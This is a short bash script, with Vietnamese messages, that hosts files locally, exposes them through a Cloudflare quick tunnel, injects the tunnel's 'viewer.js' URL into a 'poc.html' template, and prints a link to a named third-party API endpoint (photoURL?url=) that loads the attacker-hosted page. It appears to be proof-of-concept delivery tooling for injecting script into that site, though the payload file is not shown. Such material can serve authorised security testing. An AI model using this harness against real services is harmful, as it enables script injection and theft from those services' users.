#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

python3 -m http.server 8000 >/dev/null 2>&1 & HTTP_PID=$!
cloudflared tunnel --url http://localhost:8000 --no-autoupdate > tunnel.log 2>&1 & CF_PID=$!
cleanup() { kill $HTTP_PID $CF_PID 2>/dev/null || true; }
trap cleanup EXIT

TUNNEL=""
for _ in $(seq 1 30); do
  TUNNEL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' tunnel.log | head -1 || true)
  [ -n "$TUNNEL" ] && break
  sleep 1
done
[ -n "$TUNNEL" ] || { echo "tunnel lỗi, xem tunnel.log"; exit 1; }

enc() { python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$1"; }

sed "s|__JS__|$(enc "$TUNNEL/viewer.js")|" poc.template.html > poc.html
echo "JS MIME check: $(curl -sI "$TUNNEL/viewer.js" | grep -i '^content-type')"
echo
echo "LINK: https://qa-aiox.back3nd.xyz/api/user/photoURL?url=$(enc "$TUNNEL/poc.html")"
echo
echo "Đang chạy... Ctrl+C để dừng (tunnel + http server sẽ tắt)."
wait